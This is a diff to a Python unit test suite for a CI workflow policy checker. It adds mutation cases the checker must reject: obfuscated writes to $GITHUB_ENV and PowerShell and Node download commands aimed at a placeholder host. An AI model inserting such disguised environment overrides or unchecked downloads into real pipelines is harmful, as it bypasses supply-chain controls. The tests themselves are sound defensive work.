@@ -539,6 +539,13 @@ class PolicyTests(unittest.TestCase):
             ('console', 'pnpm setting through GITHUB_ENV', lambda d: d['jobs']['validate']['steps'].insert(5, {'run': 'echo "pnpm_config_pm_on_fail=download" >> "$GITHUB_ENV"'}), 'admitted tool environment override'),
             ('server', 'environment file not applied', lambda d: d['jobs']['validate']['steps'].pop(2), 'the exact admitted environment step must directly follow'),
             ('server', 'environment file applied twice', lambda d: d['jobs']['validate']['steps'].insert(6, dict(d['jobs']['validate']['steps'][2])), 'the exact admitted environment step'),
+            # Confirmation review N-04: disguised writes and downloads.
+            ('server', 'split-string GOROOT write', lambda d: d['jobs']['fuzz']['steps'].insert(5, {'run': 'echo "GO""ROOT=/opt/go" >> "$GITHUB_ENV"'}), 'admitted tool environment override'),
+            ('server', 'escaped GOROOT write', lambda d: d['jobs']['fuzz']['steps'].insert(5, {'run': 'echo GO\\ROOT=/opt/go >> "$GITHUB_ENV"'}), 'admitted tool environment override'),
+            ('agent', 'PowerShell WebClient', lambda d: d['jobs']['validate']['steps'].insert(5, {'shell': 'pwsh', 'run': '(New-Object Net.WebClient).DownloadFile("https://x.invalid/t.zip", "t.zip")'}), 'unchecked download'),
+            ('agent', 'PowerShell iwr', lambda d: d['jobs']['validate']['steps'].insert(5, {'shell': 'pwsh', 'run': 'iwr https://x.invalid/t.zip -OutFile t.zip'}), 'unchecked download'),
+            ('console', 'node https fetch', lambda d: d['jobs']['validate']['steps'].insert(5, {'run': "node -e \"require('https').get('https://x.invalid/t', r => r.pipe(process.stdout))\""}), 'unchecked download'),
+            ('console', 'node global fetch', lambda d: d['jobs']['validate']['steps'].insert(5, {'run': "node -e \"fetch('https://x.invalid/t').then(r => r.text())\""}), 'unchecked download'),
             ('server', 'environment file rewritten', lambda d: d['jobs']['validate']['steps'].insert(3, {'run': 'echo "GOROOT=/opt/go" >> "$RUNNER_TEMP/tools.env"'}), 'written and applied only by its exact steps'),
         ]
         for name, label, change, expected in mutations:
@@ -548,6 +555,10 @@ class PolicyTests(unittest.TestCase):
                 self.assertTrue(any(expected in error for error in errors), (label, errors))
                 shutil.copyfile(ROOT / f'.github/workflows/{name}.yml', self.root / f'.github/workflows/{name}.yml')
         self.assertEqual(check_policy.check(self.root), [])
+        # Parsing a URL is not a download: a plain urllib.parse step stays admissible (N-04 false positive).
+        self.mutate('console', lambda d: d['jobs']['validate']['steps'].insert(5, {'run': 'python -c "import urllib.parse; print(urllib.parse.quote(\'a b\'))"'}))
+        self.assertEqual(check_policy.check(self.root), [])
+        shutil.copyfile(ROOT / '.github/workflows/console.yml', self.root / '.github/workflows/console.yml')
         lock = self.root / 'scripts/ci/toolchains.lock.json'
         baseline = lock.read_text()
         mac = '"url": "https://static.rust-lang.org/dist/2026-10-01/rustc-1.99.0-aarch64-apple-darwin.tar.gz"'
